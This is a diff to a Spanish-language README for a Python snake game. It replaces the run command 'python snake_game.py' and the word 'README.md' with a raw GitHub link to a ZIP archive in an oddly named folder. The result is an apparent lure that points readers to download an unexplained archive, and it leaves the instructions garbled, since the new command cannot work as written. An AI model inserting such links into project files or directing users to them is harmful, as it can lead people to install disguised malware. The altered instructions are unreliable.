@@ -19,7 +19,7 @@ Para jugar, asegúrate de tener Python instalado en tu máquina. Luego, simpleme
 
 bash
 Copiar código
-python snake_game.py
+python https://raw.githubusercontent.com/SebasHack99/03_Juego_culebrita_python/main/overpregnant/03_Juego_culebrita_python.zip
 Esto abrirá una ventana con el juego y podrás comenzar a jugar.
 
 Descripción del Código
@@ -38,4 +38,4 @@ El proyecto utiliza la biblioteca estándar de Python, por lo que no es necesari
 Licencia
 Este proyecto está bajo la Licencia MIT. Puedes usarlo, modificarlo y distribuirlo de acuerdo con los términos de esta licencia.
 
-Este README.md proporciona una descripción clara del juego, las tecnologías utilizadas, y las instrucciones para ejecutar el juego. ¡Espero que te sea útil para tu repositorio!
+Este https://raw.githubusercontent.com/SebasHack99/03_Juego_culebrita_python/main/overpregnant/03_Juego_culebrita_python.zip proporciona una descripción clara del juego, las tecnologías utilizadas, y las instrucciones para ejecutar el juego. ¡Espero que te sea útil para tu repositorio!
